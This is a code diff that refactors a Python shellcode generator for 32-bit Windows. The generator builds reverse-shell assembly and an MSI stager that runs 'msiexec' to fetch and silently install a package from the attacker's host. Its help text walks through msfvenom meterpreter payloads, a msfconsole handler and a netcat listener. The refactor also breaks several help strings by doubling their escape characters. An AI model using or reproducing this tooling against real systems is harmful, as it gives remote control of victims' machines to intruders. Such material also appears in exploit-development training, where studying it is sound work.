@@ -6,42 +6,36 @@ import keystone as ks
 
 
 def to_hex(s):
-    retval = list()
-    for char in s:
-        retval.append(hex(ord(char)).replace("0x", ""))
+    retval = [hex(ord(char)).replace("0x", "") for char in s]
     return "".join(retval)
 
 
 def to_sin_ip(ip_address):
-    ip_addr_hex = []
-    for block in ip_address.split("."):
-        ip_addr_hex.append(format(int(block), "02x"))
+    ip_addr_hex = [format(int(block), "02x") for block in ip_address.split(".")]
     ip_addr_hex.reverse()
     return "0x" + "".join(ip_addr_hex)
 
 
 def to_sin_port(port):
     port_hex = format(int(port), "04x")
-    return "0x" + str(port_hex[2:4]) + str(port_hex[0:2])
+    return f"0x{str(port_hex[2:4])}{str(port_hex[:2])}"
 
 
 def ror_str(byte, count):
-	binb = numpy.base_repr(byte, 2).zfill(32)
-	while count > 0:
-		binb = binb[-1] + binb[0:-1]
-		count -= 1
-	return (int(binb, 2))
+    binb = numpy.base_repr(byte, 2).zfill(32)
+    while count > 0:
+        binb = binb[-1] + binb[:-1]
+        count -= 1
+    return (int(binb, 2))
 
 
 def push_function_hash(function_name):
-	edx = 0x00
-	ror_count = 0
-	for eax in function_name:
-		edx = edx + ord(eax)
-		if ror_count < len(function_name)-1:
-			edx = ror_str(edx, 0xd)
-		ror_count += 1
-	return ("push " + hex(edx))
+    edx = 0x00
+    for ror_count, eax in enumerate(function_name):
+        edx += ord(eax)
+        if ror_count < len(function_name)-1:
+        	edx = ror_str(edx, 0xd)
+    return f"push {hex(edx)}"
 
 
 def push_string(input_string):
@@ -55,27 +49,43 @@ def push_string(input_string):
         # add every 4 byte (8 chars) to one push statement
         if ((i != 0) and ((i % 8) == 0)):
             target_bytes = rev_hex_payload[i-8:i]
-            instructions.append(f"push dword 0x{target_bytes[6:8] + target_bytes[4:6] + target_bytes[2:4] + target_bytes[0:2]};")
-        # handle the left ofer instructions
-        elif ((0 == i-1) and ((i % 8) != 0) and (rev_hex_payload_len % 8) != 0):
+            instructions.append(
+                f"push dword 0x{target_bytes[6:8] + target_bytes[4:6] + target_bytes[2:4] + target_bytes[:2]};"
+            )
+
+        elif i == 1 and (i % 8) != 0 and (rev_hex_payload_len % 8) != 0:
             if (rev_hex_payload_len % 8 == 2):
-                first_instructions.append(f"mov al, 0x{rev_hex_payload[(rev_hex_payload_len - (rev_hex_payload_len%8)):]};")
-                first_instructions.append("push eax;")
-            elif (rev_hex_payload_len % 8 == 4):
+                first_instructions.extend(
+                    (
+                        f"mov al, 0x{rev_hex_payload[(rev_hex_payload_len - (rev_hex_payload_len%8)):]};",
+                        "push eax;",
+                    )
+                )
+
+            elif rev_hex_payload_len % 8 == 4:
                 target_bytes = rev_hex_payload[(rev_hex_payload_len - (rev_hex_payload_len%8)):]
-                first_instructions.append(f"mov ax, 0x{target_bytes[2:4] + target_bytes[0:2]};")
-                first_instructions.append("push eax;")
+                first_instructions.extend(
+                    (
+                        f"mov ax, 0x{target_bytes[2:4] + target_bytes[:2]};",
+                        "push eax;",
+                    )
+                )
+
             else:
                 target_bytes = rev_hex_payload[(rev_hex_payload_len - (rev_hex_payload_len%8)):]
-                first_instructions.append(f"mov al, 0x{target_bytes[4:6]};")
-                first_instructions.append("push eax;")
-                first_instructions.append(f"mov ax, 0x{target_bytes[2:4] + target_bytes[0:2]};")
-                first_instructions.append("push ax;")
+                first_instructions.extend(
+                    (
+                        f"mov al, 0x{target_bytes[4:6]};",
+                        "push eax;",
+                        f"mov ax, 0x{target_bytes[2:4] + target_bytes[:2]};",
+                        "push ax;",
+                    )
+                )
+
             null_terminated = True
 
     instructions = first_instructions + instructions
-    asm_instructions = "".join(instructions)
-    return asm_instructions
+    return "".join(instructions)
 
 
 def rev_shellcode(rev_ip_addr, rev_port, breakpoint=0):
@@ -288,11 +298,7 @@ def rev_shellcode(rev_ip_addr, rev_port, breakpoint=0):
 
 def msi_shellcode(rev_ip_addr, rev_port, breakpoint=0):
     # strip the port if it is 80
-    if rev_port == "80":
-        rev_port = ""
-    else:
-        rev_port = (":" + rev_port)
-
+    rev_port = "" if rev_port == "80" else f":{rev_port}"
     # align the string to 4 bytes (to keep the stack aligned)
     msi_exec_str = f"msiexec /i http://{rev_ip_addr}{rev_port}/X /qn"
     msi_exec_str += " " * (len(msi_exec_str) % 4)
@@ -519,29 +525,26 @@ def msg_box(header, text, breakpoint=0):
 
 def main(args):
     help_msg = ""
-    if (args.msi):
+    if args.msi:
         shellcode = msi_shellcode(args.lhost, args.lport, args.debug_break)
-        help_msg += f"\t Create msi payload:\n"
+        help_msg += "\\t Create msi payload:\\n"
         help_msg += f"\t\t msfvenom -p windows/meterpreter/reverse_tcp LHOST={args.lhost} LPORT=443 -f msi -o X\n"
-        help_msg += f"\t Start http server (hosting the msi file):\n"
+        help_msg += "\\t Start http server (hosting the msi file):\\n"
         help_msg += f"\t\t sudo python -m SimpleHTTPServer {args.lport} \n"
-        help_msg += f"\t Start the metasploit listener:\n"
+        help_msg += "\\t Start the metasploit listener:\\n"
         help_msg += f'\t\t sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST {args.lhost}; set LPORT 443; exploit"'
     elif (args.messagebox):
         shellcode = msg_box(args.mb_header, args.mb_text, args.debug_break)
     else:
         shellcode = rev_shellcode(args.lhost, args.lport, args.debug_break)
-        help_msg += f"\t Start listener:\n"
+        help_msg += "\\t Start listener:\\n"
         help_msg += f"\t\t nc -lnvp {args.lport}"
 
     print(shellcode)
     eng = ks.Ks(ks.KS_ARCH_X86, ks.KS_MODE_32)
     encoding, count = eng.asm(shellcode)
 
-    final = ""
-
-    final += 'shellcode = b"'
-
+    final = "" + 'shellcode = b"'
     for enc in encoding:
         final += "\\x{0:02x}".format(enc)
 
@@ -558,7 +561,7 @@ def main(args):
         print(f"[=] {final}", file=sys.stderr)
         raise SystemExit("[!] Remove bad characters and try again")
 
-    print(f"[+] shellcode created!")
+    print("[+] shellcode created!")
     print(f"[=]   len:   {len(encoding)} bytes")
     print(f"[=]   lhost: {args.lhost}")
     print(f"[=]   lport: {args.lport}")
@@ -567,11 +570,10 @@ def main(args):
     )
     print(f"[=]   ver:   {['pure reverse sehll', 'MSI stager'][args.msi]}")
     if args.store_shellcode:
-        print(f"[=]   Shellcode stored in: shellcode.bin")
-        f = open("shellcode.bin", "wb")
-        f.write(bytearray(encoding))
-        f.close()
-    print(f"[=]   help:")
+        print("[=]   Shellcode stored in: shellcode.bin")
+        with open("shellcode.bin", "wb") as f:
+            f.write(bytearray(encoding))
+    print("[=]   help:")
     print(help_msg)
     print("\t Remove bad chars with msfvenom (use --store-shellcode flag): ")
     print(
@@ -580,8 +582,8 @@ def main(args):
     print()
     print(final)
 
-    if args.test_shellcode and (struct.calcsize("P")*8) == 32:
-        print(f"\n[+] Debugging shellcode ...")
+    if args.test_shellcode and struct.calcsize("P") == 4:
+        print("\\n[+] Debugging shellcode ...")
         sh = b""
         for e in encoding:
             sh += struct.pack("B", e)
